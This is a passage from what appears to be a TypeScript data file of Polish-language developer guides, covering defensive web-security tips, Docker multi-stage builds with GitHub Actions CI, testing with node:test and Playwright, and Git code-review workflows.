      },
    ],
    keyTakeaways: [
      'Sprawdzaj uprawnienia i właściciela zasobu (owner_id) na serwerze przy każdym zapytaniu — sam ważny token zalogowania nie chroni przed IDOR.',
      'Nigdy nie ufaj linkom od użytkownika w href ani surowemu HTML; zawsze waliduj protokół (https:/http:) i sanitizuj treść.',
      'Przechowuj sesje w ciasteczkach HttpOnly + Secure + SameSite zamiast długowiecznych tokenów JWT w localStorage.',
      'Haszuj hasła przez Argon2id lub bcrypt i trzymaj wszystkie prywatne klucze wyłącznie w zmiennych środowiskowych backendu.',
    ],
    faq: [
      {
        question: 'Czy samo używanie HTTPS chroni aplikację przed XSS i SQL Injection?',
        answer: 'Nie. HTTPS szyfruje transmisję danych między przeglądarką a serwerem (chroniąc przed podsłuchem w sieci Wi-Fi), ale w żaden sposób nie blokuje wstrzyknięcia złośliwego zapytania SQL ani kodu XSS wysłanego przez napastnika w zwykłym szyfrowanym żądaniu.',
      },
      {
        question: 'Czy JWT jest zaszyfrowany — czy mogę tam zapisać tajne dane użytkownika?',
        answer: 'Standardowy token JWT (JWS) jest wyłącznie podpisany kryptograficznie i zakodowany w Base64URL, a NIE zaszyfrowany! Każdy może w sekundę odczytać jego zawartość (payload). Zapisuj w nim wyłącznie niezbędne, jawne pola jak sub (ID użytkownika), rola i czas wygaśnięcia exp.',
      },
      {
        question: 'Jak szybko wylogować użytkownika i unieważnić skradziony token JWT?',
        answer: 'Ponieważ bezstanowy JWT pozostaje ważny aż do wygaśnięcia exp, stosuj krótki czas życia access tokena (5–15 minut) w parze z refresh tokenem przechowywanym w bazie danych lub Redis — unieważnienie refresh tokena w bazie natychmiast blokuje odnawianie sesji.',
      },
    ],
    relatedLessonIds: ['sec-1', 'sec-2', 'sec-3', 'node-3'],
    relatedGuideSlugs: [
      'projektowanie-rest-api-nodejs-express-standardy',
      'postgresql-indeksy-join-optymalizacja-zapytan',
      'docker-cicd-wdrozenie-aplikacji-na-produkcje',
    ],
  },
  {
    slug: 'docker-cicd-wdrozenie-aplikacji-na-produkcje',
    title: 'Docker, multi-stage builds i CI/CD w GitHub Actions: jak bezpiecznie wdrażać aplikacje Full Stack',
    titleEn: 'Docker, Multi-Stage Builds, and GitHub Actions CI/CD: Deploying Full Stack Apps Safely',
    subtitle: 'Od „u mnie działa” do powtarzalnego wdrożenia jednym pushem — anatomia lekkiego Dockerfile, uruchamianie bez roota, zmienne środowiskowe oraz automatyczny pipeline testów.',
    subtitleEn: 'Move from "works on my machine" to repeatable deployments — slim multi-stage Dockerfiles, non-root containers, env config, and automated CI pipelines.',
    metaDescription: 'Praktyczny poradnik Dockera i CI/CD dla Full Stack Developerów: multi-stage Dockerfile dla Node.js/TypeScript, .dockerignore, bezpieczeństwo kontenerów i GitHub Actions.',
    category: 'Bezpieczeństwo & DevOps',
    categoryEn: 'Security & DevOps',
    publishedAt: '2026-11-17',
    updatedAt: '2026-11-28',
    authorName: 'Zespół Redakcyjny Full Stack Developer Academy',
    authorRole: 'DevOps & Cloud Deployment',
    level: 'Zaawansowany',
    levelEn: 'Advanced',
    leadParagraphs: [
      'Słynne zdanie „u mnie na komputerze działało” pojawia się najczęściej wtedy, gdy lokalna maszyna programisty ma inną wersję Node.js, inny system operacyjny, brakujące pakiety systemowe albo ręcznie ustawione zmienne środowiskowe niż serwer produkcyjny. Konteneryzacja w Dockerze oraz automatyzacja CI/CD (Continuous Integration / Continuous Deployment) eliminują całą tę klasę problemów, zamieniając wdrożenie w nudny, w pełni powtarzalny proces.',
      'Nie musisz być pełnoetatowym administratorem Kubernetes, aby wdrożyć profesjonalny standard DevOps w swoich projektach. Wystarczy dobrze napisany, wieloetapowy Dockerfile, rygorystyczny plik .dockerignore, lokalny docker-compose dla bazy PostgreSQL oraz prosty workflow w GitHub Actions pilnujący testów i typów TypeScript przed każdym scaleniem kodu do gałęzi main.',
    ],
    sections: [
      {
        id: 'multi-stage-dockerfile-i-cache-warstw',
        heading: 'Wieloetapowy Dockerfile (Multi-Stage Build) i kolejność warstw',
        paragraphs: [
          'Naiwnie napisany Dockerfile dla aplikacji Node.js kopiuje cały katalog projektu (wraz z node_modules i plikami .git), instaluje wszystkie narzędzia deweloperskie i zostawia obraz ważący ponad 1,2 GB. Taki obraz długo się buduje, wolno uruchamia w chmurze i zawiera dziesiątki niepotrzebnych narzędzi (kompilatory, TypeScript, frameworki testowe), które zwiększają powierzchnię ataku.',
          'Technika multi-stage build dzieli plik Dockerfile na dwa odrębne etapy. W etapie budowania (builder) kopiujesz najpierw wyłącznie package.json i package-lock.json, uruchamiasz deterministyczne npm ci (korzystając z pamięci podręcznej warstw Dockera, dzięki czemu zmiana kodu aplikacji nie pobiera od nowa paczek npm!), a następnie kompilujesz TypeScript i paczkę produkcyjną. W drugim, czystym etapie uruchomieniowym (runner) kopiujesz wyłącznie skompilowany katalog dist oraz produkcyjne zależności, przełączasz proces na nieuprzywilejowanego użytkownika node i uruchamiasz serwer.',
        ],
        codeSnippet: {
          title: 'Produkcyjny, lekki Multi-Stage Dockerfile dla aplikacji Node.js + TypeScript',
          language: 'dockerfile',
          code: `# Etap 1: Budowanie aplikacji
FROM node:22-alpine AS builder
WORKDIR /app
COPY package.json package-lock.json ./
RUN npm ci
COPY tsconfig.json ./
COPY src ./src
RUN npm run build && npm prune --omit=dev

# Etap 2: Lekki obraz produkcyjny bez narzędzi dev i bez roota
FROM node:22-alpine AS runner
WORKDIR /app
ENV NODE_ENV=production
COPY --from=builder --chown=node:node /app/package.json ./
COPY --from=builder --chown=node:node /app/node_modules ./node_modules
COPY --from=builder --chown=node:node /app/dist ./dist

USER node
EXPOSE 3000
HEALTHCHECK --interval=30s --timeout=3s --start-period=10s \\
  CMD wget -qO- http://127.0.0.1:3000/health || exit 1

CMD ["node", "dist/server.js"]`,
          caption: 'Obraz wynikowy waży ok. 140 MB zamiast ponad 1 GB, działa jako nieuprzywilejowany użytkownik node i posiada wbudowany healthcheck.',
        },
      },
      {
        id: 'dockerignore-i-konfiguracja-12-factor',
        heading: 'Plik .dockerignore oraz zasada separacji konfiguracji od kodu',
        paragraphs: [
          'Zanim jeszcze wykonasz pierwszą komendę docker build, utwórz plik .dockerignore wykluczający node_modules, .git, .env, pliki logów, raporty pokrycia testami i artefakty lokalne. Bez niego Docker przesyła cały katalog roboczy do kontekstu budowania, co nie tylko spowalnia proces, ale grozi przypadkowym zapakowaniem lokalnego pliku .env z kluczami produkcyjnymi prosto do warstwy obrazu kontenera.',
          'Zgodnie z metodyką Twelve-Factor App ten sam, niezmienny obraz kontenera powinien przechodzić kolejno przez środowisko testowe (staging) oraz produkcyjne — różnić się mogą wyłącznie wstrzykiwane w momencie uruchomienia zmienne środowiskowe (DATABASE_URL, REDIS_URL, CORS_ORIGIN). Nigdy nie buduj osobnego obrazu z wkompilowanymi hasłami dla każdego środowiska.',
        ],
      },
      {
        id: 'github-actions-ci-cd-pipeline',
        heading: 'Automatyczna bramka jakości CI w GitHub Actions',
        paragraphs: [
          'Ciągła integracja (CI) daje pewność, że żaden commit ani Pull Request nie zepsuje kompilacji, nie złamie typów TypeScript i nie wprowadzi regresji w testach jednostkowych. W GitHub Actions konfiguracja takiej bramki sprowadza się do jednego czytelnego pliku YAML w katalogu .github/workflows/ci.yml.',
          'Każdy pipeline powinien kończyć się możliwie szybko (idealnie w 1–3 minuty), dlatego włączaj cache zależności npm (cache: npm w actions/setup-node) oraz uruchamiaj kroki w logicznej kolejności od najszybszych do najwolniejszych: najpierw kontrola typów i lintera (tsc --noEmit), potem testy jednostkowe, a na końcu pełny build produkcyjny i dopiero po ich sukcesie automatyczne wdrożenie (CD).',
        ],
        codeSnippet: {
          title: 'Przykładowy plik .github/workflows/ci.yml dla projektu TypeScript Full Stack',
          language: 'yaml',
          code: `name: CI Verification
on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  verify:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 22
          cache: npm
      - run: npm ci
      - run: npm run lint
      - run: npm test
      - run: npm run build`,
          caption: 'Taki workflow automatycznie blokuje scalenie kodu z błędem składni, typów lub niezaliczonym testem.',
        },
      },
      {
        id: 'graceful-shutdown-i-monitoring',
        heading: 'Graceful Shutdown, healthchecki i wdrożenie bez przestoju',
        paragraphs: [
          'Gdy platforma chmurowa (Cloud Run, Fly.io, Render, Kubernetes) wdraża nową wersję Twojego kontenera, wysyła staremu procesowi sygnał SIGTERM. Jeśli aplikacja Node.js zignoruje ten sygnał lub zamknie się gwałtownie w połowie aktywnego żądania HTTP, część użytkowników zobaczy błąd 502 Bad Gateway, a transakcja w bazie może zostać przerwana.',
          'Poprawna implementacja Graceful Shutdown polega na nasłuchiwaniu zdarzeń process.on("SIGTERM") oraz process.on("SIGINT"), zatrzymaniu przyjmowania nowych połączeń przez server.close(), dokończeniu bieżących zapytań, zamknięciu puli połączeń z bazą danych (pool.end()) i czystym zakończeniu procesu kodem 0. W połączeniu z lekkim endpointem GET /health gwarantuje to wdrożenia całkowicie niezauważalne dla aktywnych użytkowników.',
        ],
        bulletPoints: [
          'Zawsze przypinaj konkretną wersję obrazu bazowego (np. node:22-alpine) zamiast nieprzewidywalnego tagu latest.',
          'Dodaj .dockerignore z wpisami node_modules, .git oraz .env* zanim zbudujesz pierwszy obraz.',
          'Uruchamiaj kontener jako użytkownik nieuprzywilejowany (USER node), nigdy jako root.',
          'Obsłuż sygnał SIGTERM z czystym zamknięciem serwera HTTP i puli połączeń PostgreSQL.',
        ],
      },
      {
        id: 'docker-compose-lokalny-i-debugowanie',
        heading: 'Lokalny Docker Compose i szybka diagnostyka kontenerów w razie awarii',
        paragraphs: [
          'Największą codzienną wygodą Dockera dla programisty Full Stack jest plik compose.yaml (dawniej docker-compose.yml), który jedną komendą docker compose up uruchamia dokładnie tę samą wersję PostgreSQL i Redis, jakiej używa środowisko produkcyjne. Nowy członek zespołu klonuje repozytorium, kopiuje .env.example do .env i w dwie minuty ma działającą lokalną bazę danych z migracjami bez zaśmiecania własnego systemu operacyjnego różnymi wersjami silników bazodanowych.',
          'Kiedy kontener na środowisku stagingowym nie wstaje lub natychmiast kończy działanie z kodem wyjścia 137 (OOMKilled — przekroczenie limitu pamięci RAM), nie zgaduj przyczyny. Sprawdź najpierw logi poleceniem docker logs --tail 200 nazwa_kontenera, zweryfikuj listę wstrzykniętych zmiennych środowiskowych oraz pamiętaj o zdefiniowaniu jawnych limitów pamięci i procesora. W Node.js warto również dopasować limit sterty V8 przez NODE_OPTIONS="--max-old-space-size=512" tak, aby garbage collector reagował zanim jądro Linuxa zabije cały proces kontenera.',
        ],
      },
    ],
    keyTakeaways: [
      'Multi-stage Dockerfile z npm ci i USER node redukuje rozmiar obrazu nawet o 80% i znacząco podnosi bezpieczeństwo produkcji.',
      'Plik .dockerignore chroni przed powolnymi buildami oraz przypadkowym wyciekiem lokalnego pliku .env do obrazu.',
      'Pipeline CI w GitHub Actions (lint → test → build) wychwytuje błędy zanim trafią do użytkowników.',
      'Endpoint /health oraz obsługa SIGTERM (Graceful Shutdown) umożliwiają bezprzestojowe aktualizacje w chmurze.',
    ],
    faq: [
      {
        question: 'Czym różni się npm install od npm ci w Dockerfile i GitHub Actions?',
        answer: 'npm ci instaluje dokładnie te wersje pakietów, które zapisano w pliku package-lock.json, nie modyfikuje lockfile’a i jest szybsze oraz w 100% powtarzalne w środowiskach CI/CD. Jeśli package.json nie zgadza się z lockfile’em, npm ci od razu zgłosi błąd.',
      },
      {
        question: 'Czy do małego projektu portfolio na pewno potrzebuję Kubernetes?',
        answer: 'Nie! Dla większości projektów i nawet średnich startupów w zupełności wystarczy pojedynczy kontener Docker wdrożony na platformie zarządzanej (np. Google Cloud Run, Railway, Fly.io lub Render) z zarządzaną bazą PostgreSQL i automatycznym HTTPS.',
      },
      {
        question: 'Dlaczego nie należy używać obrazów z tagiem :latest na produkcji?',
        answer: 'Tag :latest zmienia się w czasie bez Twojej wiedzy. Pewnego dnia nowa wersja główna Node.js (np. przeskok z 22 na 24) może wprowadzić niekompatybilną zmianę i zepsuć wdrożenie awaryjnej poprawki w środku nocy.',
      },
    ],
    relatedLessonIds: ['devops-1', 'devops-2', 'devops-3', 'git-1', 'git-5'],
    relatedGuideSlugs: [
      'bezpieczenstwo-aplikacji-webowych-owasp-jwt',
      'projektowanie-rest-api-nodejs-express-standardy',
      'testowanie-oprogramowania-piramida-testow-node-playwright',
    ],
  },
  {
    slug: 'testowanie-oprogramowania-piramida-testow-node-playwright',
    title: 'Testowanie aplikacji Full Stack w praktyce: piramida testów, node:test, testy API i Playwright E2E',
    titleEn: 'Testing Full Stack Applications in Practice: Test Pyramid, node:test, API Tests, and Playwright E2E',
    subtitle: 'Co naprawdę warto testować, a co jest stratą czasu — szybkie testy jednostkowe czystej logiki, testy integracyjne endpointów i kluczowych ścieżek w prawdziwej przeglądarce.',
    subtitleEn: 'What to test vs what wastes time — fast unit tests for pure logic, integration tests for APIs, and E2E browser journeys with Playwright.',
    metaDescription: 'Praktyczny przewodnik testowania aplikacji webowych: piramida testów, testy jednostkowe z wbudowanym node:test, testy integracyjne API i testy E2E w Playwright.',
    category: 'JavaScript & TypeScript',
    categoryEn: 'JavaScript & TypeScript',
    publishedAt: '2026-11-21',
    updatedAt: '2026-11-28',
    authorName: 'Zespół Redakcyjny Full Stack Developer Academy',
    authorRole: 'QA Automation & Testing Architecture',
    level: 'Średniozaawansowany',
    levelEn: 'Intermediate',
    leadParagraphs: [
      'Wielu programistów rezygnuje z pisania testów automatycznych po pierwszej nieudanej próbie: poświęcają dwa dni na mockowanie połowy wnętrzności Reacta i bazy danych, po czym każda drobna zmiana nazwy klasy CSS psuje piętnaście testów, mimo że aplikacja nadal działa bez zarzutu. Takie kruche testy nie dają bezpieczeństwa — stają się kulą u nogi.',
      'Dobre testowanie polega na odwróceniu tego podejścia: testujesz zachowanie widoczne dla użytkownika i niezmienniki logiki biznesowej, a nie szczegóły implementacji. W nowoczesnym ekosystemie Node.js (z wbudowanym runnerem node:test) oraz Playwright możesz zbudować szybką, niezawodną siatkę bezpieczeństwa w ułamku czasu dawnych, ciężkich konfiguracji.',
    ],
    sections: [
      {
        id: 'piramida-testow-i-co-testowac',
        heading: 'Piramida testów w realiach Full Stack: proporcje, które działają',
        paragraphs: [
          'Zamiast gonić za sztucznym wskaźnikiem 100 procent pokrycia linii kodu (code coverage), myśl o ryzyku biznesowym. Zastanów się: jaki błąd kosztowałby użytkowników utratę danych, pieniędzy lub zablokowanie dostępu do konta? Właśnie tam testy zwracają się wielokrotnie już przy pierwszej refaktoryzacji.',
          'Solidna strategia testowa opiera się na trzech warstwach: fundamencie bardzo szybkich testów jednostkowych dla czystych funkcji (obliczenia, walidacja, parsowanie, uprawnienia, formatowanie), środkowej warstwie testów integracyjnych sprawdzających współpracę endpointów REST API z bazą danych oraz niewielkim, precyzyjnym zestawie testów End-to-End (E2E) uruchamianych w prawdziwej przeglądarce dla najważniejszych ścieżek (np. rejestracja, wyszukiwanie, zakup, zapis formularza).',
        ],
        table: {
          caption: 'Porównanie trzech warstw testów automatycznych w aplikacji webowej',
          headers: ['Warstwa', 'Czas wykonania', 'Co testuje najlepiej', 'Narzędzia w 2026'],
          rows: [
            ['Testy jednostkowe (Unit)', 'Milisekundy', 'Czyste funkcje biznesowe, walidatory, kalkulatory, parsery', 'node:test + node:assert, Vitest'],
            ['Testy integracyjne', 'Kilka sekund', 'Endpointy API, walidacja żądań, zapytania SQL, uprawnienia', 'node:test + Supertest + testowy Postgres'],
            ['Testy E2E (Przeglądarka)', 'Dziesiątki sekund', 'Krytyczne podróże użytkownika (logowanie, checkout, nawigacja)', 'Playwright'],
          ],
        },
      },
      {
        id: 'wydzielanie-czystej-logiki-i-node-test',
        heading: 'Najważniejszy trik testowalności: odklej logikę od komponentów UI',
        paragraphs: [
          'Najprostszym sposobem na pisanie błyskawicznych i odpornych testów jest architektoniczne oddzielenie czystej logiki (pure functions) od komponentów React oraz kontrolerów Express. Jeżeli reguła naliczania rabatu, walidacja hasła albo filtrowanie listy artykułów mieszka wewnątrz komponentu JSX, przetestowanie jej wymaga symulowania DOM i cyklu życia Reacta. Jeśli tę samą funkcję wyniesiesz do pliku src/utils/pricing.ts, przetestujesz dziesięć przypadków brzegowych w 12 milisekund za pomocą wbudowanego modułu node:test bez instalowania ciężkich zależności.',
          'Pisząc testy jednostkowe, skup się na wartościach brzegowych (edge cases): pusta tablica, wartość zero, liczby ujemne, znaki specjalne w polskim alfabecie, spacje na początku i końcu napisu oraz błędny format daty. To właśnie w tych punktach kryje się 80 procent usterek produkcyjnych.',
        ],
        codeSnippet: {
          title: 'Szybki, deterministyczny test logiki domenowej we wbudowanym node:test',
          language: 'typescript',
          code: `import test from 'node:test';
import assert from 'node:assert/strict';
import { calculateInvoiceTotalCents } from './pricing';

test('calculateInvoiceTotalCents poprawnie nalicza rabat i VAT bez błędów float', () => {
  const result = calculateInvoiceTotalCents({
    items: [
      { unitPriceCents: 19900, quantity: 2 },
      { unitPriceCents: 4950, quantity: 1 },
    ],
    discountPercent: 10,
    vatPercent: 23,
  });

  assert.equal(result.subtotalCents, 44750);
  assert.equal(result.discountCents, 4475);
  assert.equal(result.netCents, 40275);
  assert.equal(result.grossCents, 49538);
});`,
          caption: 'Testowanie czystych funkcji w groszach (liczby całkowite) jest w 100% deterministyczne i niezależne od przeglądarki.',
        },
      },
      {
        id: 'playwright-i-lokatory-dostepnosci',
        heading: 'Odporne testy E2E w Playwright dzięki lokatorom dostępności',
        paragraphs: [
          'Największą przyczyną niestabilnych (flaky) testów przeglądarkowych jest wyszukiwanie elementów po kruchej strukturze CSS (div > div:nth-child(3) > span) oraz wstawianie ręcznych pauz sleep(3000). Gdy projektant doda kontener owijający, test natychmiast pada, choć strona działa idealnie.',
          'Playwright rozwiązuje oba problemy: posiada mechanizm automatycznego oczekiwania (auto-waiting) na widoczność i gotowość elementu oraz promuje lokatory oparte na drzewie dostępności użytkownika: getByRole("button", { name: "Zapisz zmiany" }), getByLabel("Adres e-mail") oraz getByHeading. Dodatkowy zysk jest bezcenny — jeżeli nie potrafisz kliknąć przycisku przez getByRole, najprawdopodobniej ma on również błąd dostępności dla prawdziwych użytkowników.',
        ],
        bulletPoints: [
          'Unikaj mockowania wszystkiego w teście — nadmierne mocki sprawdzają, czy wywołałeś własny mock, a nie czy system działa.',
          'Każdy naprawiony błąd produkcyjny utrwal jednym testem regresyjnym, który najpierw nie przechodzi, a po poprawce świeci na zielono.',
          'W testach E2E weryfikuj 3 do 5 najważniejszych ścieżek krytycznych zamiast dublować każdy drobny wariant walidacji formularza.',
          'Uruchamiaj testy automatycznie w GitHub Actions na każdym Pull Requeście.',
        ],
      },
      {
        id: 'testowanie-api-i-bledow-sieciowych',
        heading: 'Testowanie kontraktów API, stanów błędów i uprawnień bezpieczeństwa',
        paragraphs: [
          'W aplikacjach Full Stack najdroższe usterki często ukrywają się nie w ścieżce szczęśliwej (happy path), lecz w obsłudze niepowodzeń i kontroli dostępu. Dobry zestaw testów integracyjnych backendu dla każdego wrażliwego endpointu powinien weryfikować cztery scenariusze: wywołanie bez uwierzytelnienia (oczekiwany status 401), wywołanie zalogowanym użytkownikiem próbującym odczytać lub zmienić cudzy zasób (oczekiwany status 403 lub 404 — test anty-IDOR), wysłanie niepoprawnych danych wejściowych (status 400 z czytelnym komunikatem pól) oraz pełny, poprawny scenariusz tworzenia i odczytu rekordu.',
          'Po stronie przeglądarki w Playwright możesz dodatkowo deterministycznie symulować awarie sieci (page.route z odpowiedzią 500 lub przerwaniem połączenia), aby sprawdzić, czy interfejs pokazuje użytkownikowi czytelny komunikat błędu oraz działający przycisk ponowienia próby zamiast nieskończonego spinnera ładowania. Taki test trwa sekundę, a daje pewność, że aplikacja zachowa się z klasą nawet podczas chwilowej niedostępności API.',
          'Równie istotna jest izolacja danych testowych oraz diagnostyka błędów w potoku CI/CD. Każdy test powinien samodzielnie tworzyć swoje dane wejściowe i nie zależeć od kolejności uruchomienia pozostałych plików. Jeśli zestaw testów działa pojedynczo, ale losowo zawodzi przy uruchomieniu równoległym, przyczyną niemal zawsze jest współdzielony stan — globalna zmienna, ta sama tabela bazodanowa lub wspólny wpis w localStorage. W Playwright włącz zapisywanie śladu (trace: "on-first-retry") oraz zrzutów ekranu wyłącznie przy niepowodzeniu: dzięki temu analiza czerwonego builda w GitHub Actions trwa dwie minuty zamiast godziny odtwarzania problemu lokalnie.',
        ],
        bulletPoints: [
          'Weryfikuj statusy 401, 403, 400 i 404 na każdym prywatnym endpointcie backendu — to najszybsza ochrona przed regresją autoryzacji.',
          'Używaj unikalnych danych testowych (np. fabryk użytkowników i zamówień), aby testy mogły uruchamiać się równolegle bez konfliktów.',
          'Konfiguruj zapis trace i zrzutów ekranu w CI przy pierwszym błędzie, aby błyskawicznie diagnozować przyczyny awarii interfejsu.',
        ],
      },
    ],
    keyTakeaways: [
      'Oddzielaj czystą logikę obliczeniową od widoków UI — zyskujesz testy jednostkowe działające w milisekundach przez node:test.',
      'Testuj zachowanie i przypadki brzegowe (0, puste dane, błędy sieci, uprawnienia), nigdy wewnętrzne szczegóły implementacji.',
      'W testach Playwright E2E używaj lokatorów dostępności (getByRole, getByLabel) zamiast kruchych selektorów CSS i sztywnych sleepów.',
      'Test regresyjny dopisany po każdej znalezionej usterce gwarantuje, że ten sam błąd nie wróci w kolejnym wdrożeniu.',
    ],
    faq: [
      {
        question: 'Od jakich testów najlepiej zacząć w istniejącym projekcie bez żadnych testów?',
        answer: 'Zacznij od testów jednostkowych dla najważniejszych funkcji pomocniczych (obliczenia, walidacja, uprawnienia, parsowanie danych) oraz jednego testu Playwright sprawdzającego, czy strona główna i kluczowa ścieżka otwierają się bez błędów w konsoli.',
      },
      {
        question: 'Czy wbudowany node:test wystarcza zamiast Jest w nowych projektach?',
        answer: 'W większości projektów Node.js i TypeScript (szczególnie z tsx lub Vitest) wbudowany node:test działa błyskawicznie, ma zerową konfigurację i nie wymaga kilkuset megabajtów dodatkowych paczek.',
      },
      {
        question: 'Jak radzić sobie z bazą danych w testach integracyjnych?',
        answer: 'Najbezpieczniej uruchamiać osobną, tymczasową bazę testową (np. w kontenerze Docker lub osobny schemat testowy), wywoływać migracje na starcie zestawu testów i czyścić dane między testami przez transakcję lub TRUNCATE.',
      },
    ],
    relatedLessonIds: ['test-1', 'test-2', 'test-3', 'ts-1'],
    relatedGuideSlugs: [
      'docker-cicd-wdrozenie-aplikacji-na-produkcje',
      'typescript-w-praktyce-typy-generyki-walidacja',
      'projektowanie-rest-api-nodejs-express-standardy',
    ],
  },
  {
    slug: 'git-i-code-review-praca-zespolowa-w-projektach-it',
    title: 'Git i profesjonalne Code Review: praca na gałęziach, rozwiązywanie konfliktów i kultura Pull Requestów',
    titleEn: 'Git and Professional Code Review: Branching Workflows, Conflict Resolution, and Pull Request Culture',
    subtitle: 'Jak pracować z Gitem jak w komercyjnym zespole inżynierskim — konwencja commitów, bezpieczne cofanie zmian, rebase kontra merge oraz zasady pisania świetnych Pull Requestów.',
    subtitleEn: 'Work with Git like a commercial engineering team — commit conventions, safe undo workflows, rebase vs merge, and writing great Pull Requests.',
    metaDescription: 'Praktyczny przewodnik Git i Code Review: workflow gałęzi feature branch, merge vs rebase, bezpieczne cofanie zmian (revert vs reset), rozwiązywanie konfliktów i zasady PR.',
    category: 'Ścieżka Kariery',
    categoryEn: 'Career Path',
    publishedAt: '2026-11-23',
    updatedAt: '2026-11-28',
    authorName: 'Zespół Redakcyjny Full Stack Developer Academy',
    authorRole: 'Engineering Workflow & Collaboration',
    level: 'Początkujący',
    levelEn: 'Beginner',
    leadParagraphs: [
      'Podczas samodzielnej nauki Git bywa traktowany wyłącznie jako chmurowa kopia zapasowa obsługiwana trzema komendami: git add ., git commit -m "fix" oraz git push --force. W pierwszym tygodniu pracy w zespole komercyjnym ten nawyk błyskawicznie zderza się z rzeczywistością: nad tym samym repozytorium pracuje jednocześnie pięć osób, gałąź main jest chroniona przed bezpośrednim pushem, a każda zmiana przechodzi przez Code Review i automatyczne testy CI.',
      'Dobre opanowanie Gita daje ogromny spokój psychiczny podczas programowania. Kiedy rozumiesz, że Git przechowuje pełne migawki historii i pozwala bezpiecznie cofnąć niemal każdą pomyłkę (nawet przez git reflog), przestajesz bać się eksperymentowania z architekturą i swobodnie poruszasz się w dużych projektach zespołowych.',
    ],
    sections: [
      {
        id: 'workflow-galezi-i-atomowe-commity',
        heading: 'Feature branches i atomowe commity, które da się czytać za pół roku',
        paragraphs: [
          'Złota zasada pracy zespołowej mówi: gałąź main powinna w każdej chwili nadawać się do wdrożenia na produkcję. Każde nowe zadanie, poprawkę błędu albo refaktoryzację rozpoczynasz od utworzenia osobnej, krótko żyjącej gałęzi roboczej o opisowej nazwie (np. feat/guides-search-filter albo fix/invoice-tax-rounding).',
          'Zamiast wrzucać 40 zmienionych plików w jednym piątkowym commicie o opisie "poprawki", dziel pracę na małe, logiczne (atomowe) commity — każdy powinien realizować jedną spójną zmianę i pozostawiać projekt w stanie przechodzącym testy. Zastosowanie prostej konwencji Conventional Commits (feat:, fix:, refactor:, test:, docs:) sprawia, że historia git log natychmiast zamienia się w czytelną listę zmian (changelog), a w razie awarii błyskawicznie zlokalizujesz winny commit.',
        ],
        codeSnippet: {
          title: 'Bezpieczny codzienny cykl pracy na gałęzi funkcjonalnej w Git',
          language: 'bash',
          code: `# 1. Pobierz najnowszy stan main i utwórz nową gałąź
git switch main
git pull --ff-only origin main
git switch -c feat/add-guide-toc

# 2. Sprawdź dokładnie co dodajesz przed commitem
git status
git diff --stat

# 3. Utwórz czytelny, atomowy commit i wypchnij gałąź do PR
git add src/components/GuideDetailView.tsx src/utils/guides.ts
git commit -m "feat(guides): add sticky table of contents with scroll spy"
git push -u origin feat/add-guide-toc`,
          caption: 'Używanie git pull --ff-only na main chroni przed przypadkowymi commitami scalającymi w lokalnej historii.',
        },
      },
      {
        id: 'merge-rebase-revert-reset-porownanie',
        heading: 'Merge kontra Rebase oraz Revert kontra Reset — bez utraty danych',
        paragraphs: [
          'Dwie pary komend sprawiają najwięcej obaw młodszym programistom: merge kontra rebase oraz reset kontra revert. Różnica jest prosta i sprowadza się do jednej świętej zasady: nigdy nie przepisuj historii (rebase, reset --hard, push --force) na współdzielonej gałęzi takiej jak main, z której korzystają inni członkowie zespołu.',
          'Na swojej prywatnej gałęzi funkcjonalnej możesz bezpiecznie zaktualizować bazę zmian poleceniem git rebase origin/main (uzyskując czystą, liniową historię), a jeśli musisz zaktualizować już wypchniętą gałąź własnego PR, używaj zawsze bezpieczniejszego git push --force-with-lease zamiast brutalnego --force. Z kolei do cofnięcia błędnej zmiany, która zdążyła już trafić na gałąź main, używaj wyłącznie git revert — tworzy on nowy, odwrotny commit bez niszczenia śladu w historii.',
        ],
        table: {
          caption: 'Szybki przewodnik bezpiecznych operacji w Git',
          headers: ['Zadanie', 'Właściwa komenda', 'Czy zmienia wspólną historię?'],
          rows: [
            ['Cofnięcie błędu już na gałęzi main', 'git revert <hash>', 'Nie — bezpiecznie dopisuje nowy commit cofający'],
            ['Poprawa ostatniego lokalnego commitu przed pushem', 'git commit --amend', 'Tak — używaj wyłącznie lokalnie przed wysłaniem'],
            ['Tymczasowe odłożenie niezacommitowanych prac', 'git stash push -m "opis"', 'Nie — bezpieczny schowek roboczy'],
            ['Odzyskanie przypadkowo skasowanego commitu', 'git reflog + git switch -c recovery <hash>', 'Nie — ratuje historię z lokalnego dziennika'],
          ],
        },
      },
      {
        id: 'jak-pisac-i-przegladac-pull-requesty',
        heading: 'Jak tworzyć Pull Requesty, które zespół z przyjemnością sprawdza',
        paragraphs: [
          'Badania inżynierii oprogramowania pokazują, że skuteczność wyłapywania błędów podczas Code Review gwałtownie spada, gdy pojedynczy Pull Request przekracza 300–400 zmienionych linii kodu. Gigantyczny PR na dwa tysiące linii otrzymuje zwykle powierzchowne „LGTM” (Looks Good To Me), ponieważ nikt nie jest w stanie utrzymać całego kontekstu w głowie. Zawsze dziel duże funkcje na mniejsze, niezależne PR-y.',
          'Zanim poprosisz kolegów o przegląd, sam przejrzyj cały diff na GitHubie (self-review) — wyłapiesz zapomniane console.log, literówki i zbędne modyfikacje niezwiązanych plików. W opisie PR napisz krótko: CO się zmieniło, DLACZEGO podjęto taką decyzję, JAK to przetestowano (np. testy jednostkowe + zrzut ekranu dla zmian UI). Podczas oceniania cudzego kodu komentuj wyłącznie kod, nigdy autora, zadawaj pytania zamiast wydawać rozkazy i jasno oddzielaj krytyczne błędy bezpieczeństwa od drobnych sugestii stylistycznych.',
        ],
        bulletPoints: [
          'Utrzymuj Pull Requesty małe i skupione na jednym celu (nie mieszaj refaktoryzacji z nową funkcją w jednym PR).',
          'Zawsze wykonuj własny przegląd zmian (self-review) przed oznaczeniem recenzentów.',
          'Do zmian wizualnych w interfejsie dołączaj krótki zrzut ekranu „przed i po”.',
          'Gdy pojawi się konflikt merge, czytaj dokładnie obie strony kodu zamiast automatycznie wybierać „Accept Current” na ślepo.',
        ],
      },
      {
        id: 'diagnostyka-git-bisect-i-blame',
        heading: 'Zaawansowana diagnostyka: git bisect, git blame i rozwiązywanie konfliktów bez stresu',
        paragraphs: [
